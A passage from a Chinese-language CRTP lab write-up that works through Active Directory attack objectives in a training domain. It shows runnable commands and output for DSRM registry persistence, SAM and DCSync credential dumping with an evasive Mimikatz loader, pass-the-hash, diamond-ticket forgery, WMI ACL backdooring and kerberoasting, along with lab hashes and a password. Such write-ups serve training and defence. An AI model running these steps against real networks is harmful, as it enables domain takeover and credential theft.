class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Credssp</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Data</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\DPL</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\FipsAlgorithmPolicy</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\GBG</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\JD</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Kerberos</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\MSV1_0</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\OfflineLSA</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\OfflineSAM</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\OSConfig</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Skew1</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\SSO</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\SspiCache</span><br><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Tracing</span><br></pre></td></tr></table></figure>

<p>能看到是没有 <code>DsrmAdminLogonBehavior</code> key的，所以默认情况下就是0（仅在dc进入dsrm模式启用）。</p>
<p>给他add key然后赋值 <code>2</code> （允许网络登录） 就完事</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  HKLM\System\CurrentControlSet\Control\Lsa <span class="literal">-v</span> \DsrmAdminLogonBehavior /t REG_DWORD /d <span class="number">2</span> /f</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-37.png" alt="alt text"></p>
<p>然后就需要dsrm账户的ntlm了，<strong>需要从sam里导一下。</strong></p>
<p>不过先看下lsa中凭据的票</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) # lsadump::evasive-lsa /patch /user:administrator</span><br><span class="line">Domain : dcorp / S-1-5-21-719815819-3726368948-3917688648</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : administrator</span><br><span class="line">LM   :</span><br><span class="line">NTLM : af0686cc0ca8f04df42210c9ac980760</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br></pre></td></tr></table></figure>

<p>然后再看dc本地sam的，这个sam的才是dsrm的ntlmHASH</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.\loader.exe -path http://127.0.0.1:8080/safetykatz.exe -args &quot;token::elevate&quot; &quot;lsadump::evasive-sam /user:administrator&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::evasive-sam /user:administrator</span><br><span class="line">Domain : DCORP-DC</span><br><span class="line">SysKey : bab78acd91795c983aef0534e0db38c7</span><br><span class="line">Local SID : S-1-5-21-627273635-3076012327-2140009870</span><br><span class="line"></span><br><span class="line">SAMKey : f3a9473cb084668dcf1d7e5f47562659</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<p>回到自己机器上把凭证注入到终端，要注意这里<code>domian</code>要填写修改了注册表的目标dsrm域控dns</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; C:\AD\Tools\Loader.exe <span class="literal">-Path</span> C:\AD\Tools\SafetyKatz.exe <span class="string">&quot;sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe&quot;</span> <span class="string">&quot;exit&quot;</span></span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : C:\AD\Tools\SafetyKatz.exe Arguments :</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe</span></span><br><span class="line">user    : Administrator</span><br><span class="line">domain  : dcorp<span class="literal">-dc</span></span><br><span class="line">program : cmd.exe</span><br><span class="line">impers. : no</span><br><span class="line">NTLM    : a102ad5753f4c441e3af31c97fad86fd</span><br><span class="line">  |  PID  <span class="number">5432</span></span><br><span class="line">  |  TID  <span class="number">3796</span></span><br><span class="line">  |  LSA <span class="keyword">Process</span> is now <span class="built_in">R</span>/W</span><br><span class="line">  |  LUID <span class="number">0</span> ; <span class="number">20357573</span> (<span class="number">00000000</span>:<span class="number">0136</span>a1c5)</span><br><span class="line">  \_ msv1_0   - <span class="keyword">data</span> <span class="built_in">copy</span> <span class="selector-tag">@</span> <span class="number">000001</span>CE607A5A20 : OK !</span><br><span class="line">  \_ kerberos - <span class="keyword">data</span> <span class="built_in">copy</span> <span class="selector-tag">@</span> <span class="number">000001</span>CE6016A288</span><br><span class="line">   \_ aes256_hmac       -&gt; null</span><br><span class="line">   \_ aes128_hmac       -&gt; null</span><br><span class="line">   \_ rc4_hmac_nt       OK</span><br><span class="line">   \_ rc4_hmac_old      OK</span><br><span class="line">   \_ rc4_md4           OK</span><br><span class="line">   \_ rc4_hmac_nt_exp   OK</span><br><span class="line">   \_ rc4_hmac_old_exp  OK</span><br><span class="line">   \_ *Password replace <span class="selector-tag">@</span> <span class="number">000001</span>CE60702428 (<span class="number">32</span>) -&gt; null</span><br></pre></td></tr></table></figure>

<p>会弹出cmd，这里如果直接enter-pssession的话会报不信任目标机器，如下。</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-38.png" alt="alt text"></p>
<p>因为不同于krb票据认证，这里dsrm走的ip+ntlm凭证连接的，所以需要把域控ip加到信任ip里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-39.png" alt="alt text"></p>
<p>然后使用当前凭证*( NegotiateWithImplicitCredential - 自动使用当前登录用户的凭据进行身份验证，这里已经把ntlm注入了)*+域控ip，再次发起远程连接。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-40.png" alt="alt text"></p>
<h2 id="Learning-Objective-12-1"><a href="#Learning-Objective-12-1" class="headerlink" title="Learning Objective - 12	- 1"></a>Learning Objective - 12	- 1</h2><blockquote>
<p>Attack that can be executed with Replication rights (no DA privileges required)</p>
</blockquote>
<blockquote>
<p>一种可以利用‘域复制权限（Replication rights）’来执行的攻击，不需要域管理员（DA）权限。</p>
</blockquote>
<p>说实话没看懂他问的神魔瘠薄</p>
<p>所以这里用da权限账户去给student加个dcsync的acl权限，然后观察下对domain的acl属性。</p>
<p>还是用刚才钻票伪造个administrator</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> diamond /krbkey:<span class="number">154</span>cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:srvadmin /password:TheKeyUs3ron@anyMachine! /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp<span class="literal">-dc</span>.dollarcorp.moneycorp.local /ticketuserid:<span class="number">500</span> /groups:<span class="number">512</span>  /show /ptt</span><br></pre></td></tr></table></figure>

<p>用da权限给我student账户加个对当前 <code>dollarcorp.moneycorp.local</code> 域的 <code>dcsync</code> 权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=dollarcorp,DC=moneycorp,DC=local&quot;</span> <span class="literal">-Rights</span> dcsync <span class="literal">-PrincipalIdentity</span> <span class="string">&quot;student522&quot;</span> <span class="literal">-TargetDomain</span> dollarcorp.moneycorp.local <span class="literal">-PrincipalDomain</span> dollarcorp.moneycorp.local <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>然后查看student对当前 <code>dollarcorp.moneycorp.local</code> 域名的权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-Domainobjectacl</span> <span class="string">&quot;DC=dollarcorp,DC=moneycorp,DC=local&quot;</span> <span class="literal">-SearchScope</span> Base <span class="literal">-ResolveGUIDs</span>|?&#123;<span class="string">&quot;<span class="variable">$</span>(Convert-SidToName <span class="variable">$_</span>.SecurityIdentifier)&quot;</span> <span class="operator">-match</span> <span class="string">&quot;student&quot;</span>&#125;|%&#123; <span class="string">&quot;<span class="variable">$</span>(<span class="variable">$_</span>.AceQualifier) -- <span class="variable">$</span>(<span class="variable">$_</span>.ObjectAceType) - <span class="variable">$</span>(Convert-SidToName <span class="variable">$_</span>.SecurityIdentifier)&quot;</span>&#125;|<span class="built_in">fl</span></span><br><span class="line">AccessAllowed <span class="literal">--</span> DS<span class="literal">-Replication-Get-Changes-In-Filtered-Set</span> - dcorp\student522</span><br><span class="line">AccessAllowed <span class="literal">--</span> DS<span class="literal">-Replication-Get-Changes</span> - dcorp\student522</span><br><span class="line">AccessAllowed <span class="literal">--</span> DS<span class="literal">-Replication-Get-Changes-All</span> - dcorp\student522</span><br></pre></td></tr></table></figure>

<p>能看到其实是给域加了仨权限 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DS-Replication-Get-Changes-All</span><br><span class="line">DS-Replication-Get-Changes</span><br><span class="line">DS-Replication-Get-Changes-In-Filtered-Set</span><br></pre></td></tr></table></figure>

<p>现在尝试用student账户发起dcsync请求dcorp\krbtgt的key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools&gt;.\loader.exe -path .\SafetyKatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp\krbtgt&quot; &quot;exit&quot;</span><br><span class="line">[+] Successfully unhooked ETW!</span><br><span class="line">[+++] NTDLL.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNEL32.DLL IS UNHOOKED!</span><br><span class="line">[+++] KERNELBASE.DLL IS UNHOOKED!</span><br><span class="line">[+++] ADVAPI32.DLL IS UNHOOKED!</span><br><span class="line">[+] URL/PATH : .\SafetyKatz.exe Arguments : lsadump::evasive-dcsync /user:dcorp\krbtgt exit</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Nov  5 2024 21:52:02</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt</span><br><span class="line">[DC] &#x27;dollarcorp.moneycorp.local&#x27; will be the domain</span><br><span class="line">[DC] &#x27;dcorp-dc.dollarcorp.moneycorp.local&#x27; will be the DC server</span><br><span class="line">[DC] &#x27;dcorp\krbtgt&#x27; will be the user account</span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line"></span><br><span class="line">Object RDN           : krbtgt</span><br><span class="line"></span><br><span class="line">** SAM ACCOUNT **</span><br><span class="line"></span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   :</span><br><span class="line">Password last change : 11/11/2022 10:59:41 PM</span><br><span class="line">Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986</span><br><span class="line">    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986</span><br><span class="line">    lm  - 0: ea03581a1268674a828bde6ab09db837</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848</span><br><span class="line">      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e</span><br><span class="line">      des_cbc_md5       (4096) : 150ea2e934ab6b80</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : 150ea2e934ab6b80</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:WDigest *</span><br><span class="line">    01  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    02  86615bb9bf7e3c731ba1cb47aa89cf6d</span><br><span class="line">    03  637dfb61467fdb4f176fe844fd260bac</span><br><span class="line">    04  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    05  86615bb9bf7e3c731ba1cb47aa89cf6d</span><br><span class="line">    06  d2874f937df1fd2b05f528c6e715ac7a</span><br><span class="line">    07  a0e60e247b498de4cacfac3ba615af01</span><br><span class="line">    08  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    09  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    10  5c324b8ab38cfca7542d5befb9849fd9</span><br><span class="line">    11  f84dfb60f743b1368ea571504e34863a</span><br><span class="line">    12  e8ddc0d55ac23e847837791743b89d22</span><br><span class="line">    13  2281b35faded13ae4d78e33a1ef26933</span><br><span class="line">    14  f84dfb60f743b1368ea571504e34863a</span><br><span class="line">    15  d9ef5ed74ef473e89a570a10a706813e</span><br><span class="line">    16  d9ef5ed74ef473e89a570a10a706813e</span><br><span class="line">    17  87c75daa20ad259a6f783d61602086aa</span><br><span class="line">    18  f0016c07fcff7d479633e8998c75bcf7</span><br><span class="line">    19  7c4e5eb0d5d517f945cf22d74fec380e</span><br><span class="line">    20  cb97816ac064a567fe37e8e8c863f2a7</span><br><span class="line">    21  5adaa49a00f2803658c71f617031b385</span><br><span class="line">    22  5adaa49a00f2803658c71f617031b385</span><br><span class="line">    23  6d86f0be7751c8607e4b47912115bef2</span><br><span class="line">    24  caa61bbf6b9c871af646935febf86b95</span><br><span class="line">    25  caa61bbf6b9c871af646935febf86b95</span><br><span class="line">    26  5d8e8f8f63b3bb6dd48db5d0352c194c</span><br><span class="line">    27  3e139d350a9063db51226cfab9e42aa1</span><br><span class="line">    28  d745c0538c8fd103d71229b017a987ce</span><br><span class="line">    29  40b43724fa76e22b0d610d656fb49ddd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure>

<p>所以flag是 <code>DCSync</code></p>
<h2 id="Learning-Objective-13-1"><a href="#Learning-Objective-13-1" class="headerlink" title="Learning Objective - 13 - 1"></a>Learning Objective - 13 - 1</h2><blockquote>
<p>SDDL string that provides studentx same permissions as BA on root\cimv2 WMI namespace. Flag value is the permissions string from (A;CI;Permissions String;;;SID)</p>
</blockquote>
<blockquote>
<p>用来参照修改的BA在root\cimv2命名空间中的SDDL权限字符</p>
</blockquote>
<p>对应的这部分的权限</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-42.png" alt="alt text"></p>
<p>这里要用阿三的 <code>RACE.ps1</code> 来修改目标的一些服务权限，比如wmi reg等远程服务的用户权限，来让非本地管理员用户也可以远程使用。</p>
<p>还是先用钻票搞一下，然后去改dc的这部分权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\loader.exe -path .\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:srvadmin /password:TheKeyUs3ron@anyMachine! /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512  /show /ptt</span><br></pre></td></tr></table></figure>

<p>加载脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\RACE.ps1</span><br></pre></td></tr></table></figure>

<p>然后直接改掉dcorp-dc这部分内容，但是并没有指定<strong>命名空间</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt;  <span class="built_in">Set-RemotewMI</span> <span class="literal">-SamAccountName</span> student522 <span class="literal">-ComputerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-verbose</span></span><br><span class="line">VERBOSE: Existing ACL <span class="keyword">for</span> namespace root is O:BAG:BAD:(A;CI;CCDCLCSWRPWPRCWD;;;BA)(A;CI;CCDCRP;;;NS)(A;CI;CCDCRP;;;<span class="built_in">LS</span>)(A;CI;CCDCRP;;;AU)</span><br><span class="line">VERBOSE: Existing ACL <span class="keyword">for</span> DCOM is</span><br><span class="line">O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S<span class="literal">-1-5-32-562</span>)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;<span class="built_in">AC</span>)(A;;CCDCSW;;;S<span class="literal">-1-15-3-1024-2405443489-874036122-4286035555-1823921565-1746547431-2453885448-3625952902-991631256</span>)</span><br><span class="line">VERBOSE: New ACL <span class="keyword">for</span> namespace root is</span><br><span class="line">O:BAG:BAD:(A;CI;CCDCLCSWRPWPRCWD;;;BA)(A;CI;CCDCRP;;;NS)(A;CI;CCDCRP;;;<span class="built_in">LS</span>)(A;CI;CCDCRP;;;AU)(A;CI;CCDCLCSWRPWPRCWD;;;S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span>)</span><br><span class="line">VERBOSE: New ACL <span class="keyword">for</span> DCOM</span><br><span class="line">O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S<span class="literal">-1-5-32-562</span>)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;<span class="built_in">AC</span>)(A;;CCDCSW;;;S<span class="literal">-1-15-3-1024-2405443489-874036122-4286035555-1823921</span></span><br><span class="line"><span class="number">565</span><span class="literal">-1746547431-2453885448-3625952902-991631256</span>)(A;;CCDCLCSWRP;;;S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-41.png" alt="alt text"></p>
<p>然后指定下命名空间再执行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Set-RemoteWMI</span> <span class="literal">-SamAccountName</span> student522 <span class="literal">-computerName</span> dcorp<span class="literal">-dc</span> <span class="literal">-namespace</span> <span class="string">&#x27;root\cimv2&#x27;</span> <span class="literal">-Verbose</span></span><br><span class="line">VERBOSE: Existing ACL <span class="keyword">for</span> namespace root\cimv2 is</span><br><span class="line">O:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;<span class="built_in">LS</span>)(A;CIID;CCDCRP;;;AU)(A;CIID;CCDCLCSWRPWPRCWD;;;S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span>)</span><br><span class="line">VERBOSE: Existing ACL <span class="keyword">for</span> DCOM is</span><br><span class="line">O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S<span class="literal">-1-5-32-562</span>)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;<span class="built_in">AC</span>)(A;;CCDCSW;;;S<span class="literal">-1-15-3-1024-2405443489-874036122-4286035555-1823921</span></span><br><span class="line"><span class="number">565</span><span class="literal">-1746547431-2453885448-3625952902-991631256</span>)(A;;CCDCLCSWRP;;;S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span>)</span><br><span class="line">VERBOSE: New ACL <span class="keyword">for</span> namespace root\cimv2 is</span><br><span class="line">O:BAG:BAD:(A;CIID;CCDCLCSWRPWPRCWD;;;BA)(A;CIID;CCDCRP;;;NS)(A;CIID;CCDCRP;;;<span class="built_in">LS</span>)(A;CIID;CCDCRP;;;AU)(A;CIID;CCDCLCSWRPWPRCWD;;;S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span>)(A;C</span><br><span class="line">I;CCDCLCSWRPWPRCWD;;;S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span>)</span><br><span class="line">VERBOSE: New ACL <span class="keyword">for</span> DCOM</span><br><span class="line">O:BAG:BAD:(A;;CCDCLCSWRP;;;BA)(A;;CCDCSW;;;WD)(A;;CCDCLCSWRP;;;S<span class="literal">-1-5-32-562</span>)(A;;CCDCLCSWRP;;;LU)(A;;CCDCSW;;;<span class="built_in">AC</span>)(A;;CCDCSW;;;S<span class="literal">-1-15-3-1024-2405443489-874036122-4286035555-1823921</span></span><br><span class="line"><span class="number">565</span><span class="literal">-1746547431-2453885448-3625952902-991631256</span>)(A;;CCDCLCSWRP;;;S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span>)(A;;CCDCLCSWRP;;;S<span class="literal">-1-5-21-719815819-3726368948-3917688648-20682</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-43.png" alt="alt text"></p>
<p>所以flag是 <code>CCDCLCSWRPWPRCWD</code></p>
<h2 id="Learning-Objective-14-1"><a href="#Learning-Objective-14-1" class="headerlink" title="Learning Objective - 14	- 1"></a>Learning Objective - 14	- 1</h2><blockquote>
<p>SPN for which a TGS is requested</p>
</blockquote>
<blockquote>
<p>客户端请求 TGS 时，对应的 SPN 是哪个？</p>
</blockquote>
<p>这里是kerberoasting</p>
<p>所以直接用rubeus去请求spn</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> kerberoast /rc4opsec /outfile:hashes.txt</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-44.png" alt="alt text"></p>
<p>然后跑的时候会发现它跑不出来，这是因为其实是导了俩服务账户的spn，但是第一个跑不出来</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-46.png" alt="alt text"></p>
<p>而第二个因为有格式不对，没法加载。</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-45.png" alt="alt text"></p>
